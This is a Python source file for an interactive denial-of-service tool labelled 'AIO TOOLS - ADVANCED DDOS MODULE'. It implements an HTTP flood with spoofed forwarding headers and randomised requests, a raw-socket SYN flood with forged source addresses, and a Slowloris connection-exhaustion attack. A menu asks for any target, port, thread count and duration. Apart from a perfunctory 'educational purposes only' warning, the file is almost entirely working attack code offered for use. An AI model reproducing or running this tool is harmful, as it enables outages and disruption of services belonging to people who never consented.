import socket
import threading
import time
import random
import sys
import os
from datetime import datetime

class AdvancedDDOSTool:
    def __init__(self):
        self.attack_active = False
        self.stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'start_time': None,
            'threads_active': 0
        }
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
        ]
        self.methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH']
        self.paths = ['/', '/index.php', '/wp-admin/', '/api/v1', '/admin', '/login', '/register']
        self.referrers = [
            'https://www.google.com/', 'https://www.bing.com/', 'https://search.yahoo.com/',
            'https://duckduckgo.com/', 'https://www.facebook.com/', 'https://twitter.com/'
        ]
        
    def generate_fake_ip(self):
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    def create_http_request(self, target_ip, target_port):
        method = random.choice(self.methods)
        path = random.choice(self.paths)
        user_agent = random.choice(self.user_agents)
        referrer = random.choice(self.referrers)
        x_forwarded_for = self.generate_fake_ip()
        
        query_params = f"?id={random.randint(1,10000)}&cache={random.getrandbits(64)}&time={int(time.time())}"
        full_path = path + query_params
        
        headers = [
            f"GET {full_path} HTTP/1.1",
            f"Host: {target_ip}",
            f"User-Agent: {user_agent}",
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            f"Accept-Language: en-US,en;q=0.5",
            f"Accept-Encoding: gzip, deflate, br",
            f"Referer: {referrer}",
            f"Connection: keep-alive",
            f"Upgrade-Insecure-Requests: 1",
            f"Cache-Control: max-age=0",
            f"X-Forwarded-For: {x_forwarded_for}",
            f"X-Real-IP: {x_forwarded_for}",
            f"CF-Connecting_IP: {x_forwarded_for}"
        ]
        
        if method == "POST":
            headers.append(f"Content-Type: application/x-www-form-urlencoded")
            headers.append(f"Content-Length: {random.randint(50, 500)}")
        
        request = "\r\n".join(headers) + "\r\n\r\n"
        
        if method == "POST":
            fake_data = f"username=user{random.randint(1,1000)}&password=pass{random.getrandbits(128)}&submit=1"
            request += fake_data
        
        return request.encode()
    
    def http_flood_worker(self, target_ip, target_port, thread_id, max_requests=1000):
        request_count = 0
        while self.attack_active and request_count < max_requests:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                
                sock.connect((target_ip, target_port))
                http_request = self.create_http_request(target_ip, target_port)
                
                sock.send(http_request)
                
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += len(http_request)
                request_count += 1
                
                if request_count % 50 == 0:
                    current_time = datetime.now().strftime("%H:%M:%S")
                    print(f"[Thread-{thread_id}] Sent {request_count} requests | Total: {self.stats['packets_sent']}")
                
                time.sleep(random.uniform(0.01, 0.1))
                sock.close()
                
            except socket.error:
                time.sleep(0.5)
            except Exception as e:
                pass
    
    def syn_flood_worker(self, target_ip, target_port, thread_id):
        packet_count = 0
        while self.attack_active:
            try:
                ip_header = self.generate_ip_header(target_ip)
                tcp_header = self.generate_tcp_header(target_port)
                packet = ip_header + tcp_header
                
                raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                raw_socket.sendto(packet, (target_ip, 0))
                
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += len(packet)
                packet_count += 1
                
                if packet_count % 100 == 0:
                    print(f"[SYN-{thread_id}] Packets: {packet_count}")
                
                time.sleep(0.001)
                
            except:
                time.sleep(0.1)
    
    def generate_ip_header(self, dst_ip):
        version_ihl = 69
        tos = 0
        total_length = 40
        identification = random.randint(1, 65535)
        flags_fragment = 0
        ttl = 255
        protocol = socket.IPPROTO_TCP
        checksum = 0
        source_ip = self.generate_fake_ip()
        
        ip_header = bytes([
            version_ihl, tos,
            (total_length >> 8) & 0xFF, total_length & 0xFF,
            (identification >> 8) & 0xFF, identification & 0xFF,
            (flags_fragment >> 8) & 0xFF, flags_fragment & 0xFF,
            ttl, protocol,
            (checksum >> 8) & 0xFF, checksum & 0xFF
        ])
        
        ip_header += socket.inet_aton(source_ip)
        ip_header += socket.inet_aton(dst_ip)
        
        return ip_header
    
    def generate_tcp_header(self, dst_port):
        source_port = random.randint(1024, 65535)
        sequence = random.randint(1, 4294967295)
        ack_number = 0
        data_offset_reserved = (5 << 4)
        flags = 0x02
        window = socket.htons(5840)
        checksum = 0
        urgent_pointer = 0
        
        tcp_header = bytes([
            (source_port >> 8) & 0xFF, source_port & 0xFF,
            (dst_port >> 8) & 0xFF, dst_port & 0xFF,
            (sequence >> 24) & 0xFF, (sequence >> 16) & 0xFF,
            (sequence >> 8) & 0xFF, sequence & 0xFF,
            (ack_number >> 24) & 0xFF, (ack_number >> 16) & 0xFF,
            (ack_number >> 8) & 0xFF, ack_number & 0xFF,
            data_offset_reserved, flags,
            (window >> 8) & 0xFF, window & 0xFF,
            (checksum >> 8) & 0xFF, checksum & 0xFF,
            (urgent_pointer >> 8) & 0xFF, urgent_pointer & 0xFF
        ])
        
        return tcp_header
    
    def slowloris_worker(self, target_ip, target_port, thread_id):
        sockets_list = []
        try:
            for i in range(100):
                if not self.attack_active:
                    break
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((target_ip, target_port))
                
                sock.send(f"GET /?{random.randint(1,9999)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {target_ip}\r\n".encode())
                sock.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode())
                sock.send("Accept: text/html,application/xhtml+xml\r\n".encode())
                sock.send("Accept-Language: en-US,en;q=0.9\r\n".encode())
                sock.send("Connection: keep-alive\r\n".encode())
                
                sockets_list.append(sock)
                self.stats['packets_sent'] += 1
                
                if len(sockets_list) % 10 == 0:
                    print(f"[Slowloris-{thread_id}] Open connections: {len(sockets_list)}")
                
                time.sleep(random.uniform(1, 3))
            
            while self.attack_active and sockets_list:
                for sock in sockets_list[:]:
                    try:
                        sock.send(f"X-a: {random.randint(1,9999)}\r\n".encode())
                        time.sleep(random.uniform(10, 30))
                    except:
                        sockets_list.remove(sock)
                
                time.sleep(1)
                
        except:
            pass
        finally:
            for sock in sockets_list:
                try:
                    sock.close()
                except:
                    pass
    
    def display_stats(self):
        while self.attack_active:
            elapsed = (datetime.now() - self.stats['start_time']).total_seconds()
            if elapsed > 0:
                packets_per_sec = self.stats['packets_sent'] / elapsed
                mb_sent = self.stats['bytes_sent'] / (1024 * 1024)
                mb_per_sec = mb_sent / elapsed
                
                print(f"\n[STATS] Time: {elapsed:.1f}s | Packets: {self.stats['packets_sent']} "
                      f"| Rate: {packets_per_sec:.1f}/s | Data: {mb_sent:.2f}MB | "
                      f"Bandwidth: {mb_per_sec:.2f}MB/s")
            
            time.sleep(2)
    
    def start_attack(self, target_ip, target_port=80, threads=100, attack_type="http", duration=60):
        print(f"[AIO DDOS] Starting attack on {target_ip}:{target_port}")
        print(f"[CONFIG] Threads: {threads} | Type: {attack_type} | Duration: {duration}s")
        print("[WARNING] For educational purposes only!")
        
        self.attack_active = True
        self.stats['start_time'] = datetime.now()
        self.stats['packets_sent'] = 0
        self.stats['bytes_sent'] = 0
        
        stats_thread = threading.Thread(target=self.display_stats, daemon=True)
        stats_thread.start()
        
        worker_threads = []
        
        for i in range(threads):
            if attack_type == "http":
                worker = threading.Thread(
                    target=self.http_flood_worker,
                    args=(target_ip, target_port, i, 10000),
                    daemon=True
                )
            elif attack_type == "syn":
                worker = threading.Thread(
                    target=self.syn_flood_worker,
                    args=(target_ip, target_port, i),
                    daemon=True
                )
            elif attack_type == "slowloris":
                worker = threading.Thread(
                    target=self.slowloris_worker,
                    args=(target_ip, target_port, i),
                    daemon=True
                )
            else:
                worker = threading.Thread(
                    target=self.http_flood_worker,
                    args=(target_ip, target_port, i, 10000),
                    daemon=True
                )
            
            worker_threads.append(worker)
            worker.start()
            time.sleep(0.01)
        
        self.stats['threads_active'] = len(worker_threads)
        print(f"[INFO] {len(worker_threads)} attack threads started")
        
        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            print("\n[INTERRUPT] Attack stopped by user")
        
        self.attack_active = False
        print("[STOPPING] Waiting for threads to finish...")
        time.sleep(3)
        
        final_stats = self.stats.copy()
        elapsed = (datetime.now() - final_stats['start_time']).total_seconds()
        
        print("\n" + "="*70)
        print("ATTACK SUMMARY")
        print("="*70)
        print(f"Target: {target_ip}:{target_port}")
        print(f"Duration: {elapsed:.1f} seconds")
        print(f"Total Packets Sent: {final_stats['packets_sent']}")
        print(f"Total Data Sent: {final_stats['bytes_sent'] / (1024*1024):.2f} MB")
        print(f"Average Rate: {final_stats['packets_sent']/elapsed:.1f} packets/sec")
        print("="*70)
        
        return final_stats

def main():
    print("\n" + "="*70)
    print("AIO TOOLS - ADVANCED DDOS MODULE")
    print("="*70)
    print("WARNING: This tool is for EDUCATIONAL and TESTING purposes ONLY!")
    print("Use only on systems you OWN or have EXPLICIT permission to test.")
    print("="*70)
    
    tool = AdvancedDDOSTool()
    
    try:
        target = input("Enter target IP or domain: ").strip()
        if not target:
            print("[ERROR] Target is required!")
            return
        
        try:
            target_ip = socket.gethostbyname(target)
        except:
            target_ip = target
        
        port_input = input("Enter target port (default 80): ").strip()
        target_port = int(port_input) if port_input.isdigit() else 80
        
        print("\nAttack Methods:")
        print("1. HTTP Flood (Layer 7)")
        print("2. SYN Flood (Layer 4)")
        print("3. Slowloris (Keep-alive)")
        
        method_choice = input("Select method (1-3, default 1): ").strip()
        if method_choice == "2":
            attack_type = "syn"
        elif method_choice == "3":
            attack_type = "slowloris"
        else:
            attack_type = "http"
        
        threads_input = input("Number of threads (default 50): ").strip()
        threads = int(threads_input) if threads_input.isdigit() else 50
        
        duration_input = input("Attack duration in seconds (default 30): ").strip()
        duration = int(duration_input) if duration_input.isdigit() else 30
        
        print(f"\n[CONFIRM] Attack {target_ip}:{target_port} with {threads} threads for {duration}s?")
        confirm = input("Type 'YES' to confirm: ").strip()
        
        if confirm.upper() == "YES":
            print("\n[STARTING] Attack in progress... Press Ctrl+C to stop early\n")
            time.sleep(2)
            
            tool.start_attack(target_ip, target_port, threads, attack_type, duration)
        else:
            print("[CANCELLED] Attack not confirmed")
    
    except KeyboardInterrupt:
        print("\n[INTERRUPT] Operation cancelled")
    except Exception as e:
        print(f"[ERROR] {e}")
    
    print("\n[COMPLETE] Returning to main menu...")
    time.sleep(2)

if __name__ == "__main__":
    main()